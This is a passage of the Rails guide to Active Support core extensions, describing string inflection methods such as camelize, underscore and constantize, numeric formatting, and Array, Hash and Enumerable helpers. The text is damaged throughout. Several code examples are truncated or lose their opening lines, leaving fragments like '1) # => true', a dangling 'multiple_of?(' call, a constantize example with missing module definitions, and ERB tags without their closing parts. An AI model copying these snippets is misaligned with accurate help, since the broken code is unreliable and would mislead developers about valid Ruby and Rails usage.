INFO: As a rule of thumb you can think of `camelize` as the inverse of `underscore`, though there are cases where that does not hold: `"SSLError".underscore.camelize` gives back `"SslError"`. 
To support cases such as this, Active Support allows you to specify acronyms in `config/initializers/inflections.rb`:
  inflect.acronym 'SSL'
"SSLError".underscore.camelize # => "SSLError"
`camelize` is aliased to `camelcase`.
#### `underscore`
The method `underscore` goes the other way around, from camel case to paths:
"Product".underscore   # => "product"
"AdminUser".underscore # => "admin_user"
Also converts "::" back to "/":
"Backoffice::Session".underscore # => "backoffice/session"
and understands strings that start with lowercase:
"visualEffect".underscore # => "visual_effect"
`underscore` accepts no argument though.
Rails class and module autoloading uses `underscore` to infer the relative path without extension of a file that would define a given missing constant:
# active_support/dependencies.rb
def load_missing_constant(from_mod, const_name)
  qualified_name = qualified_name_for from_mod, const_name
  path_suffix = qualified_name.underscore
INFO: As a rule of thumb you can think of `underscore` as the inverse of `camelize`, though there are cases where that does not hold. 
For example, `"SSLError".underscore.camelize` gives back `"SslError"`.
#### `titleize`
The method `titleize` capitalizes the words in the receiver:
"alice in wonderland".titleize # => "Alice In Wonderland"
"fermat's enigma".titleize     # => "Fermat's Enigma"
`titleize` is aliased to `titlecase`.
#### `dasherize`
The method `dasherize` replaces the underscores in the receiver with dashes:
"name".dasherize         # => "name"
"contact_data".dasherize # => "contact-data"
The XML serializer of models uses this method to dasherize node names:
# active_model/serializers/xml.rb
def reformat_name(name)
  name = name.camelize if camelize?
  dasherize? ? 
name.dasherize : name
#### `demodulize`
Given a string with a qualified constant name, `demodulize` returns the very constant name, that is, the rightmost part of it:
"Product".demodulize                        # => "Product"
"Backoffice::UsersController".demodulize    # => "UsersController"
"Admin::Hotel::ReservationUtils".demodulize # => "ReservationUtils"
"::Inflections".demodulize                  # => "Inflections"
"".demodulize                               # => ""
Active Record for example uses this method to compute the name of a counter cache column:
def counter_cache_column
  if options[:counter_cache] == true
    "#{active_record.name.demodulize.underscore.pluralize}_count"
  elsif options[:counter_cache]
    options[:counter_cache]
#### `deconstantize`
Given a string with a qualified constant reference expression, `deconstantize` removes the rightmost segment, generally leaving the name of the constant's container:
"Product".deconstantize                        # => ""
"Backoffice::UsersController".deconstantize    # => "Backoffice"
"Admin::Hotel::ReservationUtils".deconstantize # => "Admin::Hotel"
Active Support for example uses this method in `Module#qualified_const_set`:
def qualified_const_set(path, value)
  QualifiedConstUtils.raise_if_absolute(path)
  const_name = path.demodulize
  mod_name = path.deconstantize
  mod = mod_name.empty? ? 
self : qualified_const_get(mod_name)
  mod.const_set(const_name, value)
#### `parameterize`
The method `parameterize` normalizes its receiver in a way that can be used in pretty URLs.
"John Smith".parameterize # => "john-smith"
"Kurt Gödel".parameterize # => "kurt-godel"
In fact, the result string is wrapped in an instance of `ActiveSupport::Multibyte::Chars`.
#### `tableize`
The method `tableize` is `underscore` followed by `pluralize`.
"Person".tableize      # => "people"
"Invoice".tableize     # => "invoices"
"InvoiceLine".tableize # => "invoice_lines"
As a rule of thumb, `tableize` returns the table name that corresponds to a given model for simple cases. 
The actual implementation in Active Record is not straight `tableize` indeed, because it also demodulizes the class name and checks a few options that may affect the returned string.
#### `classify`
The method `classify` is the inverse of `tableize`. 
It gives you the class name corresponding to a table name:
"people".classify        # => "Person"
"invoices".classify      # => "Invoice"
"invoice_lines".classify # => "InvoiceLine"
The method understands qualified table names:
"highrise_production.companies".classify # => "Company"
Note that `classify` returns a class name as a string. 
You can get the actual class object invoking `constantize` on it, explained next.
#### `constantize`
The method `constantize` resolves the constant reference expression in its receiver:
"M::X".constantize # => 1
If the string evaluates to no known constant, or its content is not even a valid constant name, `constantize` raises `NameError`.
Constant name resolution by `constantize` starts always at the top-level `Object` even if there is no leading "::".
X = :in_Object
  X = :in_M
  X                 # => :in_M
  "::X".constantize # => :in_Object
  "X".constantize   # => :in_Object (!)
So, it is in general not equivalent to what Ruby would do in the same spot, had a real constant be evaluated.
Mailer test cases obtain the mailer being tested from the name of the test class using `constantize`:
# action_mailer/test_case.rb
def determine_default_mailer(name)
  name.sub(/Test$/, '').constantize
rescue NameError => e
  raise NonInferrableMailerError.new(name)
#### `humanize`
The method `humanize` tweaks an attribute name for display to end users.
Specifically performs these transformations:
  * Applies human inflection rules to the argument.
  * Deletes leading underscores, if any.
  * Removes a "_id" suffix if present.
  * Replaces underscores with spaces, if any.
  * Downcases all words except acronyms.
  * Capitalizes the first word.
The capitalization of the first word can be turned off by setting the<n>+:capitalize+ option to false (default is true).
"name".humanize                         # => "Name"
"author_id".humanize                    # => "Author"
"author_id".humanize(capitalize: false) # => "author"
"comments_count".humanize               # => "Comments count"
"_id".humanize                          # => "Id"
If "SSL" was defined to be an acronym:
'ssl_error'.humanize # => "SSL error"
The helper method `full_messages` uses `humanize` as a fallback to include<n>attribute names:
def full_messages
  map { |attribute, message| full_message(attribute, message) }
def full_message
  attr_name = attribute.to_s.tr('.', '_').humanize
  attr_name = @base.class.human_attribute_name(attribute, default: attr_name)
#### `foreign_key`
The method `foreign_key` gives a foreign key column name from a class name. 
To do so it demodulizes, underscores, and adds "_id":
"User".foreign_key           # => "user_id"
"InvoiceLine".foreign_key    # => "invoice_line_id"
"Admin::Session".foreign_key # => "session_id"
Pass a false argument if you do not want the underscore in "_id":
"User".foreign_key(false) # => "userid"
Associations use this method to infer foreign keys, for example `has_one` and `has_many` do this:
# active_record/associations.rb
foreign_key = options[:foreign_key] || reflection.active_record.name.foreign_key
### Conversions
#### `to_date`, `to_time`, `to_datetime`
The methods `to_date`, `to_time`, and `to_datetime` are basically convenience wrappers around `Date._parse`:
"2010-07-27".to_date              # => Tue, 27 Jul 2010
"2010-07-27 23:37:00".to_time     # => Tue Jul 27 23:37:00 UTC 2010
"2010-07-27 23:37:00".to_datetime # => Tue, 27 Jul 2010 23:37:00 +0000
`to_time` receives an optional argument `:utc` or `:local`, to indicate which time zone you want the time in:
"2010-07-27 23:42:00".to_time(:utc)   # => Tue Jul 27 23:42:00 UTC 2010
"2010-07-27 23:42:00".to_time(:local) # => Tue Jul 27 23:42:00 +0200 2010
Default is `:utc`.
Please refer to the documentation of `Date._parse` for further details.
INFO: The three of them return `nil` for blank receivers.
NOTE: Defined in `active_support/core_ext/string/conversions.rb`.
Extensions to `Numeric`
### Bytes
All numbers respond to these methods:
kilobytes
megabytes
gigabytes
terabytes
petabytes
exabytes
They return the corresponding amount of bytes, using a conversion factor of 1024:
2.kilobytes   # => 2048
3.megabytes   # => 3145728
3.5.gigabytes # => 3758096384
-4.exabytes   # => -4611686018427387904
Singular forms are aliased so you are able to say:
1.megabyte # => 1048576
NOTE: Defined in `active_support/core_ext/numeric/bytes.rb`.
### Time
Enables the use of time calculations and declarations, like `45.minutes + 2.hours + 4.years`.
These methods use Time#advance for precise date calculations when using from_now, ago, etc.<n>as well as adding or subtracting their results from a Time object. 
# equivalent to Time.current.advance(months: 1)
1.month.from_now
# equivalent to Time.current.advance(years: 2)
2.years.from_now
# equivalent to Time.current.advance(months: 4, years: 5)
(4.months + 5.years).from_now
### Formatting
Enables the formatting of numbers in a variety of ways.
Produce a string representation of a number as a telephone number:
5551234.to_s(:phone)
# => 555-1234
1235551234.to_s(:phone)
# => 123-555-1234
1235551234.to_s(:phone, area_code: true)
# => (123) 555-1234
1235551234.to_s(:phone, delimiter: " ")
# => 123 555 1234
1235551234.to_s(:phone, area_code: true, extension: 555)
# => (123) 555-1234 x 555
1235551234.to_s(:phone, country_code: 1)
# => +1-123-555-1234
Produce a string representation of a number as currency:
1234567890.50.to_s(:currency)                 # => $1,234,567,890.50
1234567890.506.to_s(:currency)                # => $1,234,567,890.51
1234567890.506.to_s(:currency, precision: 3)  # => $1,234,567,890.506
Produce a string representation of a number as a percentage:
100.to_s(:percentage)
# => 100.000%
100.to_s(:percentage, precision: 0)
# => 100%
1000.to_s(:percentage, delimiter: '.', separator: ',')
# => 1.000,000%
302.24398923423.to_s(:percentage, precision: 5)
# => 302.24399%
Produce a string representation of a number in delimited form:
12345678.to_s(:delimited)                     # => 12,345,678
12345678.05.to_s(:delimited)                  # => 12,345,678.05
12345678.to_s(:delimited, delimiter: ".")     
# => 12.345.678
12345678.to_s(:delimited, delimiter: ",")     # => 12,345,678
12345678.05.to_s(:delimited, separator: " ")  # => 12,345,678 05
Produce a string representation of a number rounded to a precision:
111.2345.to_s(:rounded)                     # => 111.235
111.2345.to_s(:rounded, precision: 2)       # => 111.23
13.to_s(:rounded, precision: 5)             # => 13.00000
389.32314.to_s(:rounded, precision: 0)      # => 389
111.2345.to_s(:rounded, significant: true)  # => 111
Produce a string representation of a number as a human-readable number of bytes:
123.to_s(:human_size)            # => 123 Bytes
1234.to_s(:human_size)           # => 1.21 KB
12345.to_s(:human_size)          # => 12.1 KB
1234567.to_s(:human_size)        # => 1.18 MB
1234567890.to_s(:human_size)     # => 1.15 GB
1234567890123.to_s(:human_size)  # => 1.12 TB
Produce a string representation of a number in human-readable words:
123.to_s(:human)               # => "123"
1234.to_s(:human)              # => "1.23 Thousand"
12345.to_s(:human)             # => "12.3 Thousand"
1234567.to_s(:human)           # => "1.23 Million"
1234567890.to_s(:human)        # => "1.23 Billion"
1234567890123.to_s(:human)     # => "1.23 Trillion"
1234567890123456.to_s(:human)  # => "1.23 Quadrillion"
NOTE: Defined in `active_support/core_ext/numeric/conversions.rb`.
Extensions to `Integer`
### `multiple_of?
The method `multiple_of?` tests whether an integer is multiple of the argument:
1) # => true
2) # => false
NOTE: Defined in `active_support/core_ext/integer/multiple.rb`.
### `ordinal`
The method `ordinal` returns the ordinal suffix string corresponding to the receiver integer:
1.ordinal    # => "st"
2.ordinal    # => "nd"
53.ordinal   # => "rd"
2009.ordinal # => "th"
-21.ordinal  # => "st"
-134.ordinal # => "th"
NOTE: Defined in `active_support/core_ext/integer/inflections.rb`.
### `ordinalize`
The method `ordinalize` returns the ordinal string corresponding to the receiver integer. 
In comparison, note that the `ordinal` method returns **only** the suffix string.
1.ordinalize    # => "1st"
2.ordinalize    # => "2nd"
53.ordinalize   # => "53rd"
-21.ordinalize  # => "-21st"
-134.ordinalize # => "-134th"
Extensions to `BigDecimal`
### `to_s`
The method `to_s` is aliased to `to_formatted_s`. 
This provides a convenient way to display a BigDecimal value in floating-point notation:
BigDecimal.new(5.00, 6).to_s  # => "5.0"
### `to_formatted_s`
Te method `to_formatted_s` provides a default specifier of "F".  
This means that a simple call to `to_formatted_s` or `to_s` will result in floating point representation instead of engineering notation:
BigDecimal.new(5.00, 6).to_formatted_s  # => "5.0"
and that symbol specifiers are also supported:
BigDecimal.new(5.00, 6).to_formatted_s(:db)  # => "5.0"
Engineering notation is still supported:
BigDecimal.new(5.00, 6).to_formatted_s("e")  # => "0.5E1"
Extensions to `Enumerable`
### `sum`
The method `sum` adds the elements of an enumerable:
[1, 2, 3].sum # => 6
(1..100).sum  # => 5050
Addition only assumes the elements respond to `+`:
[[1, 2], [2, 3], [3, 4]].sum    # => [1, 2, 2, 3, 3, 4]
%w(foo bar baz).sum             # => "foobarbaz"
{a: 1, b: 2, c: 3}.sum # => [:b, 2, :c, 3, :a, 1]
The sum of an empty collection is zero by default, but this is customizable:
[].sum    # => 0
[].sum(1) # => 1
If a block is given, `sum` becomes an iterator that yields the elements of the collection and sums the returned values:
(1..5).sum {|n| n * 2 } # => 30
[2, 4, 6, 8, 10].sum    # => 30
The sum of an empty receiver can be customized in this form as well:
[].sum(1) {|n| n**3} # => 1
NOTE: Defined in `active_support/core_ext/enumerable.rb`.
### `index_by`
The method `index_by` generates a hash with the elements of an enumerable indexed by some key.
It iterates through the collection and passes each element to a block. 
The element will be keyed by the value returned by the block:
invoices.index_by(&:number)
# => {'2009-032' => <Invoice ...
>, '2009-008' => <Invoice ...
>, ...}
WARNING. Keys should normally be unique. 
If the block returns the same value for different elements no collection is built for that key. 
The last item will win.
NOTE: Defined in `active_support/core_ext/enumerable.rb`.
### `many?
The method `many?` is shorthand for `collection.size > 1`:
<% if pages.many? 
  <%= pagination_links %>
If an optional block is given, `many?` only takes into account those elements that return true:
@see_more = videos.many? 
{|video| video.category == params[:category]}
### `exclude?
The predicate `exclude?` tests whether a given object does **not** belong to the collection. 
It is the negation of the built-in `include?`:
to_visit << node if visited.exclude?(
Extensions to `Array`
### Accessing
Active Support augments the API of arrays to ease certain ways of accessing them. 
For example, `to` returns the subarray of elements up to the one at the passed index:
%w(a b c d).to(2) # => %w(a b c)
[].to(7)          # => []
Similarly, `from` returns the tail from the element at the passed index to the end. 
If the index is greater than the length of the array, it returns an empty array.
%w(a b c d).from(2)  # => %w(c d)
%w(a b c d).from(10) # => []
[].from(0)           # => []
The methods `second`, `third`, `fourth`, and `fifth` return the corresponding element (`first` is built-in). 
Thanks to social wisdom and positive constructiveness all around, `forty_two` is also available.
%w(a b c d).third # => c
%w(a b c d).fifth # => nil
NOTE: Defined in `active_support/core_ext/array/access.rb`.
### Adding Elements
#### `prepend`
This method is an alias of `Array#unshift`.
%w(a b c d).prepend('e')  # => %w(e a b c d)
[].prepend(10)            # => [10]
NOTE: Defined in `active_support/core_ext/array/prepend_and_append.rb`.
#### `append`
This method is an alias of `Array#<<`.
%w(a b c d).append('e')  # => %w(a b c d e)
[].append([1,2])         # => [[1,2]]
### Options Extraction
When the last argument in a method call is a hash, except perhaps for a `&block` argument, Ruby allows you to omit the brackets:
email: params[:email])
That syntactic sugar is used a lot in Rails to avoid positional arguments where there would be too many, offering instead interfaces that emulate named parameters. 
In particular it is very idiomatic to use a trailing hash for options.
If a method expects a variable number of arguments and uses `*` in its declaration, however, such an options hash ends up being an item of the array of arguments, where it loses its role.
In those cases, you may give an options hash a distinguished treatment with `extract_options!
If it is a hash it pops it and returns it, otherwise it returns an empty hash.
Let's see for example the definition of the `caches_action` controller macro:
def caches_action(*actions)
  return unless cache_configured?
  options = actions.extract_options!
This method receives an arbitrary number of action names, and an optional hash of options as last argument. 
With the call to `extract_options!` you obtain the options hash and remove it from `actions` in a simple and explicit way.
NOTE: Defined in `active_support/core_ext/array/extract_options.rb`.
#### `to_sentence`
The method `to_sentence` turns an array into a string containing a sentence that enumerates its items:
%w().to_sentence                # => ""
%w(Earth).to_sentence           # => "Earth"
%w(Earth Wind).to_sentence      # => "Earth and Wind"
%w(Earth Wind Fire).to_sentence # => "Earth, Wind, and Fire"
This method accepts three options:
* `:two_words_connector`: What is used for arrays of length 2. 
Default is " and ".
* `:words_connector`: What is used to join the elements of arrays with 3 or more elements, except for the last two. 
Default is ", ".
* `:last_word_connector`: What is used to join the last items of an array with 3 or more elements. 
Default is ", and ".
The defaults for these options can be localized, their keys are:
| Option                 | I18n key                            |
| ---------------------- | ----------------------------------- |
| `:two_words_connector` | `support.array.two_words_connector` |
| `:words_connector`     | `support.array.words_connector`     |
| `:last_word_connector` | `support.array.last_word_connector` |
NOTE: Defined in `active_support/core_ext/array/conversions.rb`.
#### `to_formatted_s`
The method `to_formatted_s` acts like `to_s` by default.
If the array contains items that respond to `id`, however, the symbol<n>`:db` may be passed as argument. 
That's typically used with<n>collections of Active Record objects. 
Returned strings are:
[].to_formatted_s(:db)            # => "null"
[user].to_formatted_s(:db)        # => "8456"
invoice.lines.to_formatted_s(:db) # => "23,567,556,12"
Integers in the example above are supposed to come from the respective calls to `id`.
#### `to_xml`
The method `to_xml` returns a string containing an XML representation of its receiver:
Contributor.limit(2).order(:rank).to_xml
xml version="1.0" encoding="UTF-8"?
# <contributors type="array">
#   <contributor>
#     <id type="integer">4356</id>
#     <name>Jeremy Kemper</name>
#     <rank type="integer">1</rank>
#     <url-id>jeremy-kemper</url-id>
#   </contributor>
#     <id type="integer">4404</id>
#     <name>David Heinemeier Hansson</name>
#     <rank type="integer">2</rank>
#     <url-id>david-heinemeier-hansson</url-id>
# </contributors>
To do so it sends `to_xml` to every item in turn, and collects the results under a root node. 
All items must respond to `to_xml`, an exception is raised otherwise.
By default, the name of the root element is the underscorized and dasherized plural of the name of the class of the first item, provided the rest of elements belong to that type (checked with `is_a?`) and they are not hashes. 
In the example above that's "contributors".
If there's any element that does not belong to the type of the first one the root node becomes "objects":
[Contributor.first, Commit.first].to_xml
# <objects type="array">
#   <object>
#     <id type="integer">4583</id>
#     <name>Aaron Batalion</name>
#     <rank type="integer">53</rank>
#     <url-id>aaron-batalion</url-id>
#   </object>
#     <author>Joshua Peek</author>
#     <authored-timestamp type="datetime">2009-09-02T16:44:36Z</authored-timestamp>
#     <branch>origin/master</branch>
#     <committer>Joshua Peek</committer>
#     <git-show nil="true"></git-show>
#     <id type="integer">190316</id>
#     <imported-from-svn type="boolean">false</imported-from-svn>
#     <message>Kill AMo observing wrap_with_notifications since ARes was only using it</message>
#     <sha1>723a47bfb3708f968821bc969a9a3fc873a3ed58</sha1>
# </objects>
If the receiver is an array of hashes the root element is by default also "objects":
[{a: 1, b: 2}, {c: 3}].to_xml
#     <b type="integer">2</b>
#     <a type="integer">1</a>
#     <c type="integer">3</c>
WARNING. If the collection is empty the root element is by default "nil-classes". 
That's a gotcha, for example the root element of the list of contributors above would not be "contributors" if the collection was empty, but "nil-classes". 
You may use the `:root` option to ensure a consistent root element.
The name of children nodes is by default the name of the root node singularized. 
In the examples above we've seen "contributor" and "object". 
The option `:children` allows you to set these node names.
The default XML builder is a fresh instance of `Builder::XmlMarkup`. 
You can configure your own builder via the `:builder` option. 
The method also accepts options like `:dasherize` and friends, they are forwarded to the builder:
Contributor.limit(2).order(:rank).to_xml(skip_types: true)
# <contributors>
#     <id>4356</id>
#     <rank>1</rank>
#     <id>4404</id>
#     <rank>2</rank>
### Wrapping
The method `Array.wrap` wraps its argument in an array unless it is already an array (or array-like).
Specifically:
* Otherwise, if the argument responds to `to_ary` it is invoked, and if the value of `to_ary` is not `nil`, it is returned.
* Otherwise, an array with the argument as its single element is returned.
Array.wrap(nil)       # => []
Array.wrap([1, 2, 3]) # => [1, 2, 3]
Array.wrap(0)         # => [0]
This method is similar in purpose to `Kernel#Array`, but there are some differences:
* If the argument responds to `to_ary` the method is invoked. 
* If the returned value from `to_ary` is neither `nil` nor an `Array` object, `Kernel#Array` raises an exception, while `Array.wrap` does not, it just returns the value.
The last point is particularly worth comparing for some enumerables:
Array.wrap(foo: :bar) # => [{:foo=>:bar}]
Array(foo: :bar)      # => [[:foo, :bar]]
There's also a related idiom that uses the splat operator:
[*object]
which in Ruby 1.8 returns `[nil]` for `nil`, and calls to `Array(object)` otherwise. 
(Please if you know the exact behavior in 1.9 contact fxn.)
Thus, in this case the behavior is different for `nil`, and the differences with `Kernel#Array` explained above apply to the rest of `object`s.
NOTE: Defined in `active_support/core_ext/array/wrap.rb`.
### Duplicating
The method `Array.deep_dup` duplicates itself and all objects inside<n>recursively with Active Support method `Object#deep_dup`. 
It works like `Array#map` with sending `deep_dup` method to each object inside.
array = [1, [2, 3]]
dup = array.deep_dup
dup[1][2] = 4
array[1][2] == nil   # => true
### Grouping
#### `in_groups_of(number, fill_with = nil)`
The method `in_groups_of` splits an array into consecutive groups of a certain size. 
It returns an array with the groups:
[1, 2, 3].in_groups_of(2) # => [[1, 2], [3, nil]]
or yields them in turn if a block is passed:
<% sample.in_groups_of(3) do |a, b, c| %>
    <td><%= a %></td>
    <td><%= b %></td>
    <td><%= c %></td>
The first example shows `in_groups_of` fills the last group with as many `nil` elements as needed to have the requested size. 
You can change this padding value using the second optional argument:
[1, 2, 3].in_groups_of(2, 0) # => [[1, 2], [3, 0]]
And you can tell the method not to fill the last group passing `false`:
[1, 2, 3].in_groups_of(2, false) # => [[1, 2], [3]]
As a consequence `false` can't be a used as a padding value.
NOTE: Defined in `active_support/core_ext/array/grouping.rb`.
#### `in_groups(number, fill_with = nil)`
The method `in_groups` splits an array into a certain number of groups. 
The method returns an array with the groups:
%w(1 2 3 4 5 6 7).in_groups(3)
# => [["1", "2", "3"], ["4", "5", nil], ["6", "7", nil]]
%w(1 2 3 4 5 6 7).in_groups(3) {|group| p group}
["1", "2", "3"]
["4", "5", nil]
["6", "7", nil]
The examples above show that `in_groups` fills some groups with a trailing `nil` element as needed. 
And the groups that have them are always the last ones.
%w(1 2 3 4 5 6 7).in_groups(3, "0")
# => [["1", "2", "3"], ["4", "5", "0"], ["6", "7", "0"]]
And you can tell the method not to fill the smaller groups passing `false`:
%w(1 2 3 4 5 6 7).in_groups(3, false)
# => [["1", "2", "3"], ["4", "5"], ["6", "7"]]
#### `split(value = nil)`
The method `split` divides an array by a separator and returns the resulting chunks.
If a block is passed the separators are those elements of the array for which the block returns true:
(-5..5).to_a.split { |i| i.multiple_of?(
# => [[-5], [-3, -2, -1], [1, 2, 3], [5]]
Otherwise, the value received as argument, which defaults to `nil`, is the separator:
[0, 1, -5, 1, 1, "foo", "bar"].split(1)
# => [[0], [-5], [], ["foo", "bar"]]
TIP: Observe in the previous example that consecutive separators result in empty arrays.
Extensions to `Hash`
{"foo" => 1, "bar" => 2}.to_xml
# <hash>
#   <foo type="integer">1</foo>
#   <bar type="integer">2</bar>
# </hash>
To do so, the method loops over the pairs and builds nodes that depend on the _values_. 
Given a pair `key`, `value`:
* If `value` is a hash there's a recursive call with `key` as `:root`.
* If `value` is an array there's a recursive call with `key` as `:root`, and `key` singularized as `:children`.
* If `value` is a callable object it must expect one or two arguments. 
Depending on the arity, the callable is invoked with the `options` hash as first argument with `key` as `:root`, and `key` singularized as second argument. 
Its return value becomes a new node.
* If `value` responds to `to_xml` the method is invoked with `key` as `:root`.
* Otherwise, a node with `key` as tag is created with a string representation of `value` as text node. 
If `value` is `nil` an attribute "nil" set to "true" is added. 
Unless the option `:skip_types` exists and is true, an attribute "type" is added as well according to the following mapping:
XML_TYPE_NAMES = {
  "Symbol"     => "symbol",
  "BigDecimal" => "decimal",
  "Float"      => "float",
  "TrueClass"  => "boolean",
  "FalseClass" => "boolean",
  "Date"       => "date",
  "DateTime"   => "datetime",
  "Time"       => "datetime"
By default the root node is "hash", but that's configurable via the `:root` option.
You can configure your own builder with the `:builder` option. 
The method also accepts options like `:dasherize` and friends, they are forwarded to the builder.
NOTE: Defined in `active_support/core_ext/hash/conversions.rb`.
### Merging
Ruby has a built-in method `Hash#merge` that merges two hashes:
{a: 1, b: 1}.merge(a: 0, c: 2)
# => {:a=>0, :b=>1, :c=>2}
Active Support defines a few more ways of merging hashes that may be convenient.
#### `reverse_merge` and `reverse_merge!
In case of collision the key in the hash of the argument wins in `merge`. 
You can support option hashes with default values in a compact way with this idiom:
options = {length: 30, omission: "..."}.merge(options)
Active Support defines `reverse_merge` in case you prefer this alternative notation:
options = options.reverse_merge(length: 30, omission: "...")
And a bang version `reverse_merge!` that performs the merge in place:
length: 30, omission: "...")
WARNING. Take into account that `reverse_merge!` may change the hash in the caller, which may or may not be a good idea.
NOTE: Defined in `active_support/core_ext/hash/reverse_merge.rb`.
#### `reverse_update`
The method `reverse_update` is an alias for `reverse_merge!`, explained above.
WARNING. Note that `reverse_update` has no bang.
#### `deep_merge` and `deep_merge!
As you can see in the previous example if a key is found in both hashes the value in the one in the argument wins.
Active Support defines `Hash#deep_merge`. 
In a deep merge, if a key is found in both hashes and their values are hashes in turn, then their _merge_ becomes the value in the resulting hash:
{a: {b: 1}}.deep_merge(a: {c: 2})
# => {:a=>{:b=>1, :c=>2}}
The method `deep_merge!` performs a deep merge in place.
NOTE: Defined in `active_support/core_ext/hash/deep_merge.rb`.
### Deep duplicating
The method `Hash.deep_dup` duplicates itself and all keys and values<n>inside recursively with Active Support method `Object#deep_dup`. 
It works like `Enumerator#each_with_object` with sending `deep_dup` method to each pair inside.
hash = { a: 1, b: { c: 2, d: [3, 4] } }
dup = hash.deep_dup
dup[:b][:e] = 5
dup[:b][:d] << 5
hash[:b][:e] == nil      # => true
hash[:b][:d] == [3, 4]   # => true
### Working with Keys
#### `except` and `except!
The method `except` returns a hash with the keys in the argument list removed, if present:
{a: 1, b: 2}.except(:a) # => {:b=>2}
If the receiver responds to `convert_key`, the method is called on each of the arguments. 
This allows `except` to play nice with hashes with indifferent access for instance:
{a: 1}.with_indifferent_access.except(:a)  # => {}
{a: 1}.with_indifferent_access.except("a") # => {}
There's also the bang variant `except!` that removes keys in the very receiver.
NOTE: Defined in `active_support/core_ext/hash/except.rb`.
#### `transform_keys` and `transform_keys!
The method `transform_keys` accepts a block and returns a hash that has applied the block operations to each of the keys in the receiver:
{nil => nil, 1 => 1, a: :a}.transform_keys { |key| key.to_s.upcase }
# => {"" => nil, "A" => :a, "1" => 1}
In case of key collision, one of the values will be chosen. 
The chosen value may not always be the same given the same hash:
{"a" => 1, a: 2}.transform_keys { |key| key.to_s.upcase }
# The result could either be
# => {"A"=>2}
# => {"A"=>1}
This method may be useful for example to build specialized conversions. 
For instance `stringify_keys` and `symbolize_keys` use `transform_keys` to perform their key conversions:
def stringify_keys
  transform_keys { |key| key.to_s }
def symbolize_keys
  transform_keys { |key| key.to_sym rescue key }
There's also the bang variant `transform_keys!` that applies the block operations to keys in the very receiver.
Besides that, one can use `deep_transform_keys` and `deep_transform_keys!` to perform the block operation on all the keys in the given hash and all the hashes nested into it. 
An example of the result is:
{nil => nil, 1 => 1, nested: {a: 3, 5 => 5}}.deep_transform_keys { |key| key.to_s.upcase }
# => {""=>nil, "1"=>1, "NESTED"=>{"A"=>3, "5"=>5}}
NOTE: Defined in `active_support/core_ext/hash/keys.rb`.
#### `stringify_keys` and `stringify_keys!
The method `stringify_keys` returns a hash that has a stringified version of the keys in the receiver. 
It does so by sending `to_s` to them:
{nil => nil, 1 => 1, a: :a}.stringify_keys
# => {"" => nil, "a" => :a, "1" => 1}
{"a" => 1, a: 2}.stringify_keys
# => {"a"=>2}
# => {"a"=>1}
This method may be useful for example to easily accept both symbols and strings as options. 
For instance `ActionView::Helpers::FormHelper` defines:
def to_check_box_tag(options = {}, checked_value = "1", unchecked_value = "0")
  options = options.stringify_keys
  options["type"] = "checkbox"
The second line can safely access the "type" key, and let the user to pass either `:type` or "type".
There's also the bang variant `stringify_keys!` that stringifies keys in the very receiver.
Besides that, one can use `deep_stringify_keys` and `deep_stringify_keys!` to stringify all the keys in the given hash and all the hashes nested into it. 
{nil => nil, 1 => 1, nested: {a: 3, 5 => 5}}.deep_stringify_keys
# => {""=>nil, "1"=>1, "nested"=>{"a"=>3, "5"=>5}}
#### `symbolize_keys` and `symbolize_keys!
The method `symbolize_keys` returns a hash that has a symbolized version of the keys in the receiver, where possible. 
It does so by sending `to_sym` to them:
{nil => nil, 1 => 1, "a" => "a"}.symbolize_keys
# => {1=>1, nil=>nil, :a=>"a"}
WARNING. Note in the previous example only one key was symbolized.
{"a" => 1, a: 2}.symbolize_keys
# => {:a=>2}
# => {:a=>1}
For instance `ActionController::UrlRewriter` defines
def rewrite_path(options)
  options = options.symbolize_keys
  options.update(options[:params].symbolize_keys) if options[:params]
The second line can safely access the `:params` key, and let the user to pass either `:params` or "params".
There's also the bang variant `symbolize_keys!` that symbolizes keys in the very receiver.
Besides that, one can use `deep_symbolize_keys` and `deep_symbolize_keys!` to symbolize all the keys in the given hash and all the hashes nested into it. 
{nil => nil, 1 => 1, "nested" => {"a" => 3, 5 => 5}}.deep_symbolize_keys
# => {nil=>nil, 1=>1, nested:{a:3, 5=>5}}
#### `to_options` and `to_options!
The methods `to_options` and `to_options!` are respectively aliases of `symbolize_keys` and `symbolize_keys!`.
#### `assert_valid_keys`
The method `assert_valid_keys` receives an arbitrary number of arguments, and checks whether the receiver has any key outside that white list. 
If it does `ArgumentError` is raised.
{a: 1}.assert_valid_keys(:a)  # passes
{a: 1}.assert_valid_keys("a") # ArgumentError
Active Record does not accept unknown options when building associations, for example. 
It implements that control via `assert_valid_keys`.
### Working with Values
#### `transform_values` && `transform_values!`
The method `transform_values` accepts a block and returns a hash that has applied the block operations to each of the values in the receiver.
{ nil => nil, 1 => 1, :x => :a }.transform_values { |value| value.to_s.upcase }
# => {nil=>"", 1=>"1", :x=>"A"}
There's also the bang variant `transform_values!` that applies the block operations to values in the very receiver.
NOTE: Defined in `active_support/core_text/hash/transform_values.rb`.
### Slicing
Ruby has built-in support for taking slices out of strings and arrays. 
Active Support extends slicing to hashes:
{a: 1, b: 2, c: 3}.slice(:a, :c)
# => {:c=>3, :a=>1}
{a: 1, b: 2, c: 3}.slice(:b, :X)
# => {:b=>2} # non-existing keys are ignored
If the receiver responds to `convert_key` keys are normalized:
{a: 1, b: 2}.with_indifferent_access.slice("a")
NOTE. Slicing may come in handy for sanitizing option hashes with a white list of keys.
There's also `slice!` which in addition to perform a slice in place returns what's removed:
hash = {a: 1, b: 2}
rest = hash.slice!(:a) # => {:b=>2}
hash                   # => {:a=>1}
NOTE: Defined in `active_support/core_ext/hash/slice.rb`.
### Extracting
The method `extract!` removes and returns the key/value pairs matching the given keys.
rest = hash.extract!(:a) # => {:a=>1}
hash                     # => {:b=>2}
The method `extract!` returns the same subclass of Hash, that the receiver is.
hash = {a: 1, b: 2}.with_indifferent_access
rest = hash.extract!(:a).class
# => ActiveSupport::HashWithIndifferentAccess
### Indifferent Access
The method `with_indifferent_access` returns an `ActiveSupport::HashWithIndifferentAccess` out of its receiver:
{a: 1}.with_indifferent_access["a"] # => 1
NOTE: Defined in `active_support/core_ext/hash/indifferent_access.rb`.
### Compacting
The methods `compact` and `compact!` return a Hash without items with `nil` value.
{a: 1, b: 2, c: nil}.compact # => {a: 1, b: 2}
NOTE: Defined in `active_support/core_ext/hash/compact.rb`.
Extensions to `Regexp`
### `multiline?
The method `multiline?` says whether a regexp has the `/m` flag set, that is, whether the dot matches newlines.
%r{.}m.multiline? 
Regexp.new('.').multiline?                    
Regexp.new('.', Regexp::MULTILINE).multiline? 
Rails uses this method in a single place, also in the routing code. 
Multiline regexps are disallowed for route requirements and this flag eases enforcing that constraint.
